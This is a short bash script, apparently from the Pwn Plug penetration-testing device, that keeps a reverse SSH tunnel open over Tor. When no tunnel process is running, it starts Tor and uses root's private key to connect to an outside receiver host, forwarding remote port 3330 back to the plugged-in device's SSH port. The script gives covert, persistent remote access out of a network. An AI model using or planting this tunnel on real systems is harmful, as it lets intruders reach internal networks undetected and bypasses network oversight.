#!/bin/bash
# Copyright 2010-2015 Rapid Focus Security, LLC
# pwnieexpress.com
#
# This script contains proprietary software distributed under the terms of the Rapid Focus Security, LLC End User License Agreement (EULA).
#
# Use of this software signifies your agreement to the Rapid Focus Security, LLC End User License Agreement (EULA).
#
# Rapid Focus Security, LLC EULA: http://pwnieexpress.com/pdfs/RFSEULA.pdf
#
# Revision: 4.10.2011

# Get user variables from script_configs
# SSH_receiver=
SSH_receiver_port=22
. /var/pwnplug/script_configs/reverse_ssh_over_Tor_config.sh

# Set static variables
SSH_user=pwnplug
SSH_key="/root/.ssh/id_rsa"
SSH_status=`ps ax |grep -v grep |grep -o "ssh -NR 3330"`

if [ "$SSH_status" == "ssh -NR 3330" ] ; then echo connected ; \
else \
/etc/init.d/tor start; \
ssh -NR 3330:localhost:22 -i "$SSH_key" "$SSH_user"@"$Tor_receiver" -p "$SSH_receiver_port"; \
fi

